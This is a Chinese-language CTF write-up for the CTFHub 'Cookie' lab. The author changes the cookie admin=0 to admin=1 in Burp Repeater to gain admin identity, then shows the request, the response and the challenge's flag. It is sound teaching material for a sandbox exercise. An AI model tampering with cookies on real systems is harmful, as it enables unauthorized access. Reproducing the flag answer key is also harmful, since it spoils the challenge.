# WP：Cookie

> **CTFHub 路径**：技能树 → Web → Web 前置技能 → HTTP 协议 → Cookie
> **任务**：按题目提示修改 Cookie，拿到 flag。
> **提示**：在 DevTools 的 Application/Storage → Cookies 中查看 Cookie，或在 Burp 的请求头中查看。修改后重放请求，观察页面变化。
> **截图要求**：能看到修改后的 Cookie 请求头，以及服务器返回的 flag 或成功页面。

---

## 题目信息

| 项目 | 内容 |
| --- | --- |
| 环境地址 |http://challenge-b6e795a4034a272c.sandbox.ctfhub.com:10800 /|
| Flag | ctfhub{c7f2654a4f74e188c7c7895a} |

## 解题过程

我在Burp抓包的请求头中看到Cookie，原始值为 admin=0 。我将Cookie的值修改为 admin=1 ，在Repeater中重新发送请求。修改之后服务器识别为管理员身份，返回了flag。该实验说明客户端发送的Cookie是可控的，可以人为篡改。

## 关键请求/响应

```http
请求包
GET / HTTP/1.1

Host: challenge-b6e795a4034a272c.sandbox.ctfhub.com:10800

Accept-Language: en-US,en;q=0.9

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Accept-Encoding: gzip, deflate, br

Cookie: admin=1

Connection: keep-alive
响应包
HTTP/1.1 200 OK

Server: openresty/1.21.4.2

Date: Fri, 30 Oct 2026 10:18:55 GMT

Content-Type: text/html; charset=UTF-8

Connection: keep-alive

X-Powered-By: PHP/5.6.40

Access-Control-Allow-Origin: *

Access-Control-Allow-Headers: X-Requested-With

Access-Control-Allow-Methods: *

Content-Length: 32



ctfhub{c7f2654a4f74e188c7c7895a}



```

## 原理与复盘

Cookie放在HTTP请求头里面。服务器读取请求头里Cookie中的数据，判断用户身份，完成识别。

---

## 截图

![Cookie](../imgs/lab5_cookie.png)

> 可以在这份 WP 中另加过程截图；检查时只看指定图片，额外图片不检查。

